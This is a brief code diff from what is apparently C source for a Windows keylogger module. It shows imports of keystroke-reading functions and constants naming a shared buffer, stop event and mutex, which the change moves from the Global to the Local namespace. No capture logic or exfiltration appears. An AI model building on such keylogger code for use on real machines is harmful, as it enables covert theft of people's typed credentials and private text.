@@ -35,9 +35,9 @@ DECLSPEC_IMPORT SHORT  WINAPI USER32$GetAsyncKeyState(int);
 DECLSPEC_IMPORT int    WINAPI USER32$ToUnicode(UINT, UINT, const BYTE*, LPWSTR, int, UINT);
 
 #define KEYLOG_MAGIC      0xDEADBEEF
-#define KEYLOG_MAP_NAME   "Global\\keylog_buf"
-#define KEYLOG_STOP_NAME  "Global\\keylog_stop"
-#define KEYLOG_MUTEX_NAME "Global\\keylog_mutex"
+#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
+#define KEYLOG_STOP_NAME  "Local\\keylog_stop"
+#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"
 #define KEYLOG_DEFAULT_BUF_KB 64
 
 #pragma pack(push, 1)
